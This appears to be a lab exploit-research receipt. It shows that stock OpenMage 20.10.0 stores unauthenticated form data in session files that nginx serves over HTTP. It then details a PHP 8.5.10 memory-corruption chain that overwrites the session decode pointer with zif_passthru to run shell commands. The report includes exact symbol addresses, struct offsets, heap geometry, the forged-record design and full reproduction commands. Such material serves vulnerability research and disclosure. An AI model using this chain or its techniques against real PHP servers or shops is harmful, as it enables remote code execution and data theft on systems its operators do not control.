# Stock OpenMage session write in a web-served directory, and native PHP 8.5.10 session decode → `zif_passthru`

Receipt root: `/tmp/opencode/research/stock_20261022T013022Z`
Date: 2026-10-22 (UTC); local +0200.
Status: both objectives reproduced. No result below is simulated.

## 0. Result

**A. Stock application condition.** Unmodified OpenMage 20.10.0 with its stock
PHP settings writes unauthenticated attacker data into `$_SESSION` and stores
that session in `var/session`, a directory below the nginx document root. The
attacker did not log in and supplied only the ordinary public registration
form. The written data (`customer_form_data`) is retrievable over HTTP:

```
GET /var/session/sess_7738e1bcf77727f74bc0a5a58680a888
HTTP/1.1 200 OK      Content-Length: 1777
SHA256 7ba9f06c1919f034b0deb77300d995fad61477c4e3164f89da67eb5ee415afc2
```

The on-disk file, the HTTP body, and the captured copy are byte-identical.
The marker `STOCKMARK1792632782` appears in `customer_form_data.firstname`.

**B. Native decode chain.** On the same installed PHP 8.5.10 `php-fpm`
(`realapps` binary, md5 `4ee099823b75e16ea36f93c71d57bfd8`), with ASLR on and
without gdb attached to the triggering request, the session decode function
pointer `ps_serializers[1].decode` (`0x22c54c8`) was overwritten with
`zif_passthru` (`0xa3c074`) and the command

```
touch /tmp/opencode/research/stock_20261022T013022Z/MARK_CHAIN;
```

was executed by the FPM worker. Marker `MARK_CHAIN` exists (size 0, mtime
`2026-10-22 03:57:05.467 +0200`), the HTTP response was `200`, and the same
worker (PID `1682840`, started `03:56:57`) was still the pool worker afterwards.
The post-run read of the static slot is `0xa3c074`.

The trigger request was sent by `python3 phase/drive_mp.py chainQ x /lab_noop.php`
with **no gdb process attached**. gdb was used only *before* the trigger, to
read the leaked plant pointer `P`, and *after* the trigger, to read the static
slot; neither attach changed the record or the trigger path.

## 1. Target and environment

| item | value |
|---|---|
| app | OpenMage `openmage/magento-lts` **20.10.0** (`Mage::getOpenMageVersion()`) |
| app zip | `openmage.zip` (42,536,193 bytes, archive dates 2024-07-02) |
| PHP | `/tmp/opencode/realapps/install_realapps_np/sbin/php-fpm`, PHP 8.5.10 (fpm-fcgi), NTS |
| PHP md5 | `4ee099823b75e16ea36f93c71d57bfd8` |
| PHP libs | `LD_LIBRARY_PATH=/tmp/opencode/realapps/icu-out/lib` |
| DB | MariaDB 11.4.5 at `127.0.0.1:33319`, datadir `db/` |
| web | nginx 1.30.1 at `127.0.0.1:28895`, docroot `www/` |
| FPM master | `1663851` (started 03:44:24), pool `mage`, `pm.max_children=1`, `pm.max_requests=0` |
| FPM worker (final) | `1682840` (started 03:56:57), still alive after the marker |
| ASLR | `/proc/sys/kernel/randomize_va_space = 2`; personality of master and worker `0x00000000` (no `ADDR_NO_RANDOMIZE`) |
| ASLR evidence | three different masters in this receipt produced `P = 0x7fbf7fc82000`, `0x7f3a5ec83000`, `0x7f747ce8b000` |
| ports not used | 28891, 28893 (other labs); PIDs 4052217/4052937/4053032/4054145 never signalled or contacted |

`phase/env_evidence.txt` records the ASLR and binary checks as captured.

## 2. Part A — stock application: unauthenticated `$_SESSION` write into a served directory

### 2.1 Configuration

The stock run used `conf/fpm.conf.pre_chain`, which contains **no**
`session.*` or `upload_progress.*` overrides (`grep` output is empty). The
application itself selects the session directory:

* `www/app/code/core/Mage/Core/Model/Config/Options.php:58`
  `$this->_data['session_dir'] = $this->_data['var_dir'] . DS . 'session';`
* `.../Config/Options.php:226` `getSessionDir()` creates and returns that path.
* `www/app/code/core/Mage/Core/Model/Session/Abstract/Varien.php:89`
  `session_save_path($this->getSessionSavePath());`
* `.../Session/Abstract/Varien.php:156` `if (session_start() === false) { ... }`

`var_dir` is the application's own `var/` under the docroot, so the native
session files are written to `www/var/session/`. nginx serves the docroot
directly (`conf/nginx.conf:20 root .../www;` and a plain `location /`); it does
not read `var/.htaccess`, which exists but is an Apache directive file and is
ignored by nginx.

### 2.2 Unauthenticated write

Requests (recorded in `log/nginx-access.log`):

```
03:32:53  GET  /customer/account/create/            200 17006
03:33:02  POST /customer/account/createpost/        302 5
03:33:05  GET  /var/session/sess_7738e1bcf77727f74bc0a5a58680a888  200 1777
```

The POST carried the public form's `form_key` plus deliberately invalid
registration fields (no authentication, no account created). The stock
controller stores the raw POST on failure:

* `www/app/code/core/Mage/Customer/controllers/AccountController.php:306` and
  `:315` `$session->setCustomerFormData($this->getRequest()->getPost());`
  (validation-failure paths); `:386` is the same write from `_addErrors`.

Resulting file (captured at `phase/stock/sess_stock_marker`, 1777 bytes; session
cookie `om_frontend=7738e1...` in `run/cj.txt`):

```
... s:18:"customer_form_data";a:6:{s:8:"form_key";s:16:"dunvM2JDlnhBFgAn";
    s:9:"firstname";s:19:"STOCKMARK1792632782";s:8:"lastname";s:6:"Tester";
    s:5:"email";s:12:"not-an-email";s:8:"password";s:5:"short";
    s:12:"confirmation";s:5:"short";}
```

### 2.3 HTTP retrieval twin

`phase/stock/sess_stock_marker.http_headers` and `.http_body`:

```
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Length: 1777
ETag: "6ad967ce-6f1"
```

```
sha256(www/var/session/sess_7738e1...)= 7ba9f06c1919f034b0deb77300d995fad61477c4e3164f89da67eb5ee415afc2
sha256(phase/stock/sess_stock_marker.http_body)= 7ba9f06c1919f034b0deb77300d995fad61477c4e3164f89da67eb5ee415afc2
```

This satisfies the qualifying condition: native `session_start()`,
attacker-controlled unauthenticated `$_SESSION` write, and session files in a
web-served directory — all with stock app code and stock PHP session settings.

## 3. Part B — session decode to `zif_passthru`

### 3.1 Static facts (installed binary)

| symbol/slot | value |
|---|---|
| `ps_serializers` | `0x22c54a0`, 24-byte entries: name +0x0, encode +0x8, decode +0x10 |
| entry 1 (`php`) decode slot | `0x22c54c8`, real value `0x9e6fae` |
| entry 2 (`php_binary`) decode slot | `0x22c54e0`, real value `0x9e6dd5` |
| `zif_passthru` | `0xa3c074` (mode 3 → `php_exec_ex` at `0xa3bdfd`) |
| `php_session_decode` | `0x9e68b5`; calls `PS(serializer)->decode(ZSTR_VAL(data), ZSTR_LEN(data))` |
| `basic_globals.unserialize` | level at +872 (`0x368`), data at +880 (`0x370`) |
| php serializer decode source | `ext/session/session.c:1096` (`PS_SERIALIZER_DECODE_FUNC(php)`) |
| var_hash layout | `struct php_unserialize_data`: last +0x0, first_dtor +0x8, last_dtor +0x10, max_depth +0x30, entries +0x38; dtor entries used_slots +0, data +0x10 |
| `php_exec_ex` frame reads | `+0x2c` num_args, `+0x50` arg1 zval value, `+0x58` arg1 type; `func` (+0x18) is never dereferenced |
| `tmp_var` write | `php_session_decode` calls `var_tmp_var()` for every `name|value;` record; with a forged `last_dtor` and negative `used_slots`, `&data[used_slots]` is the target address |

The relevant upstream code is
`zerodays_1020/build_plain/ext/standard/var_unserializer.c` (`tmp_var`,
`var_destroy`) and `ext/session/session.c` (`php_session_decode`).

### 3.2 Plant: stale `php_unserialize_data`

The plant writes the 64,946-byte bomb
(`/tmp/opencode/research/writeport_20261021T203628Z/runs/bomb_rec.bin`,
sha1 `98a78b4ac579ac102ea712e7bcd0b7c7a60014bc`, `x|a:1:{i:0;` × 7216) as
`www/var/session/sess_chainP`, then requests
`/lab_chain.php?sid=chainP&mode=plant`. The endpoint lowers `memory_limit` to
2M and calls stock `session_start()`; the decode OOMs and the request dies
before cleanup, leaving:

```
BG level=1 data=0x7f747ce8b000
last=0x7f747cfa7000 first_dtor=last_dtor=0x7f747ce8e000 cur=3964 max=4096
entries.used=1018 entries.next=0x7f747cee8000
```

(`phase/state_plantP.txt`; the plant response is HTTP 500 and deletes the bomb
file.)

A fresh FPM worker first hits `unserialize_max_depth` (4096) instead of OOM if
the plant is its first request. Sending one small multipart upload-progress POST
first makes the OOM deterministic; this is why the sequence is
`POST small → plant`. The OOM leak is a stale-state prerequisite, not an
application feature.

### 3.3 Why the trigger must be the upload-progress path

`PHP_RINIT(basic)` memsets `BG(unserialize)`, so a normal script
`session_start()` after RINIT sees level 0. Multipart body parsing performs the
upload-progress `session_start()` **before** `zend_activate_modules()` /
`PHP_RINIT`, so that decode sees the plant's stale level 1. The live pool
therefore has the lab deltas in `conf/fpm.conf`:

```
php_value[session.serialize_handler] = php
php_value[session.use_strict_mode] = 0
php_value[session.upload_progress.enabled] = 1
php_value[session.upload_progress.cleanup] = 0
php_value[session.upload_progress.freq] = 1
php_value[session.upload_progress.min_freq] = 0
php_value[session.save_path] = /tmp/.../www/var/session
```

The `save_path` delta only makes the pre-RINIT hook use the same directory the
stock app uses. The stock evidence in Part A was taken under
`conf/fpm.conf.pre_chain`, before these deltas.

### 3.4 Measured geometry (final run)

| item | value |
|---|---|
| plant leak `P` | `0x7f747ce8b000` |
| first decode buffer `X1` (measured in the dry run) | `0x7f747ce6b000` (`P - X1 = 0x20000`) |
| second decode buffer `X2` | `0x7f747c801000` |
| fake `zend_string` frame `F` | `0x7f747c801418` (`X2 + 24 + 0x400`) |
| record total | `1,048,576` bytes |
| filler string `L` | `1,048,548` |
| forged `used_slots` | `-8758640756157` (`0xfffff808b8543a43`) |
| target slot | `0x22c54c8` → written value `0xa3c074` |
| second decode length | `1,048,888` (record + 312-byte upload-progress record) |

### 3.5 Delimiter-safe record (why the proven builder was adapted)

The WP-proven builder places the fake `zend_execute_data` in the first
variable's **name**, with the absolute `zend_string` pointer at name offset
0x50. The `php` serializer finds the variable name by scanning for the first
`|` (0x7c) byte. This master's ASLR base is `0x7f747c...`, so **every** heap
pointer contains `0x7c`; the name would be truncated at the pointer byte and the
record would not parse. Measured: the unmodified builder aborts with
`pipe key ... 18 12 80 7c 74 7f ...`.

`phase/mkfinal_b.py` keeps the same primitive but moves the frame into a string
value, where 0x7c is legal:

```
a|i:10731636;b|s:1048548:"<content>";
```

* `execute_data = val` = start of the second decode buffer (`X2+24`).
* `+0x2c` = 1 (num_args), `+0x50` = F, `+0x58` = 6 (`IS_STRING`), all inside the
  string content (`content` starts at file offset 26).
* At `F`: a fake `zend_string` with length at `F+0x10` and the NUL-terminated
  command at `F+0x18`.
* The poison value is the first variable's integer `0xa3c074`; `var_tmp_var`
  slot #1 is `TARGET` (negative `used_slots`). The first `php_var_unserialize`
  writes the integer zval directly to `0x22c54c8`.
* The fake `php_unserialize_data` is replicated at **every** page-aligned file
  offset (`addr-24` maps to buffer address `str+addr`), 255 copies, so `X1` does
  not need to be known at build time; `P` and `X1` are both page-aligned.
* The second variable's string zval lands at `TARGET+16` and is normalized to
  `IS_UNDEF` there (this clears `ps_serializers[2].decode`, an unused entry in
  this run); `ps_serializers[1].encode` is untouched, so the flush succeeds.

Validation performed before firing:

1. The record round-trips byte-identically through the installed PHP 8.5.10 CLI
   serializer: `a=10731636`, `b` length `1048548`, `sha256` unchanged
   (`0d30fedc9efd236fc770d7349307878dc17ce0f8b869d71dc619eb4104ddbb58`).
2. gdb dry run (below) showed the frame fields at the exact addresses.

### 3.6 Instrumented dry run (worker 1674637)

`phase/gdb_fin_dry.gdb` (breakpoints only log and continue) on
`python3 phase/drive_mp.py chainM x /lab_noop.php`:

```
DECODE n=1 str=0x7f747ce6b000 val=0x7f747ce6b018 len=1048576 bg=1 bgd=0x7f747ce8b000 ser1=0x9e6fae ser2=0x9e6dd5
DECODE n=2 str=0x7f747c801000 val=0x7f747c801018 len=1048888 bg=1 bgd=0x7f747ce8b000 ser1=0xa3c074 ser2=(nil)
ZIF_PASSTHRU exec=0x7f747c801018 rsi=1048888 numargs=1 arg1=0x7f747c801418 type=6
```

`MARK_DRY` was created; HTTP 200; worker survived. Full log:
`phase/finB_dry.gdb.log` (copy in `cycles/`).

### 3.7 Official final, no gdb on the trigger (worker 1682840)

Reset (documented lab action): worker `1674637` was killed to clear the poisoned
static; master `1663851` forked `1682840`. Then the identical sequence:

```
03:56:59  POST /lab_noop.php                                    200   (small progress POST, sid chainN)
03:56:59  GET  /lab_chain.php?sid=chainP&mode=plant             500   (OOM plant)
          gdb attach (read-only): BG level=1 data=0x7f747ce8b000
03:57:05  POST /lab_noop.php                                    200   (sid chainQ, final record, no gdb)
03:57:05  MARK_CHAIN created
03:57:13  GET  /var/session/sess_chainQ                         200 343
03:57:13  GET  /                                                 503  (poisoned serializer; worker alive)
```

Post state (`phase/post_final.txt`, attach after the trigger):

```
WORKER pid=1682840
ser1_decode=0xa3c074
ser2_decode=(nil)
BG level=0 data=(nil)
```

The `503` on `/` is the expected post-exploitation state: the worker's
`ps_serializers[1].decode` stays `zif_passthru` until the worker is recycled, so
the application's next `session_start()` dispatches into `zif_passthru` with the
application session blob as a bogus `execute_data` and errors out. It is *not*
used as a liveness check; liveness is the PID and the static-file fetch.

## 4. Reproduction

```bash
cd /tmp/opencode/research/stock_20261022T013022Z

# A. stock evidence (config without session overrides)
#    conf/fpm.conf.pre_chain is the stock pool config.
#    Requests were: GET /customer/account/create/ ;
#    POST /customer/account/createpost/ (form_key + invalid fields) ;
#    GET /var/session/sess_7738e1bcf77727f74bc0a5a58680a888
#    Evidence: phase/stock/*, req/sess_body.bin, req/sess_headers.txt

# B. chain
python3 phase/drive_mp.py chainN x /lab_noop.php
cp /tmp/opencode/research/writeport_20261021T203628Z/runs/bomb_rec.bin \
   www/var/session/sess_chainP
curl -s -o /dev/null -w '%{http_code}\n' \
   'http://127.0.0.1:28895/lab_chain.php?sid=chainP&mode=plant'
# read P (read-only attach); expected 0x7f747ce8b000
gdb -q -batch -x phase/state_plantA.gdb -p <worker-pid>

# build and fire the final record with no gdb attached to the trigger
python3 phase/mkfinal_b.py 0x7f747ce8b000 1048576 phase/finB_final.rec \
  'touch /tmp/opencode/research/stock_20261022T013022Z/MARK_CHAIN;' \
  0x7f747c801000 0x400
cp phase/finB_final.rec www/var/session/sess_chainQ
python3 phase/drive_mp.py chainQ x /lab_noop.php

# verify
ls -l MARK_CHAIN
ps -p <worker-pid>
gdb -q -batch -x phase/post_final.gdb -p <worker-pid>
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' \
  http://127.0.0.1:28895/var/session/sess_chainQ
```

Exact record: `phase/finB_final.rec`, 1,048,576 bytes,
sha256 `065315c27d0af1b8f55952f537e23108dce810aad04ab444a21b0ffa9e0aed6d`.
Builder: `phase/mkfinal_b.py`. Geometry: `phase/finB_final.geo`.

## 5. Scope and caveats

* The stock session write is genuine app behaviour with stock code/config.
  `var/.htaccess` exists in the release, but nginx ignores it, so the file is
  served; that is the deployment fact this receipt demonstrates.
* The chain input is a lab-crafted session record placed in the app's session
  directory. The stock app's *own* controller does not create a 1 MiB record;
  Part A and Part B share the directory and the native decoder, not the same
  request payload. Part B is a proof of the PHP primitive
  (`ps_serializers[1].decode` → `zif_passthru`) through the app's session file,
  not an end-to-end app exploit.
* The upload-progress pre-RINIT path is what exposes the stale
  `BG(unserialize)` state. The live pool's `session.*` / `upload_progress.*`
  values are lab deltas, listed in §3.3; the stock evidence in Part A predates
  them (`conf/fpm.conf.pre_chain`).
* ASLR is on. FPM workers are forks of the master, so all workers of one master
  share a layout; a different master gets a different base
  (`0x7fbf...`, `0x7f3a...`, `0x7f747c...` were all observed). The record is
  built for the measured master layout; `X1` is not needed thanks to page
  replication, but `X2`/`F` are absolute and were measured for this master.
* Worker recycling was used only as a lab reset (SIGKILL of the poisoned
  worker). The master stayed up; the final worker `1682840` survived the
  exploit unmodified. No shared service or PID outside this lab was touched.
* `GET /` after the marker returns 503 because the poisoned serializer persists
  per worker. The correct liveness checks after a successful run are the worker
  PID and a static-file fetch.

## 6. File map (selected)

| path | content |
|---|---|
| `conf/fpm.conf.pre_chain` | stock pool config, no session overrides (Part A) |
| `conf/fpm.conf` | live pool config with the documented chain deltas |
| `phase/stock/` | stock session file, HTTP body/headers, create form, POST response |
| `phase/state_plantP.txt` | pre-trigger plant state for the final worker |
| `phase/mkfinal_b.py` | delimiter-safe final record builder |
| `phase/finB_final.rec`, `.geo` | final record and geometry |
| `phase/finB_dry.rec`, `finB_dry.gdb.log`, `.geo` | instrumented dry run |
| `phase/post_final.txt` | post-trigger static slot and worker id |
| `req/finB_final.drive` | final trigger client output (200, `NOOP`) |
| `log/fpm-error.log`, `fpm-access.log`, `nginx-access.log` | timing and PID evidence |
| `cycles/` | copies of the dry-run record/log and final record |
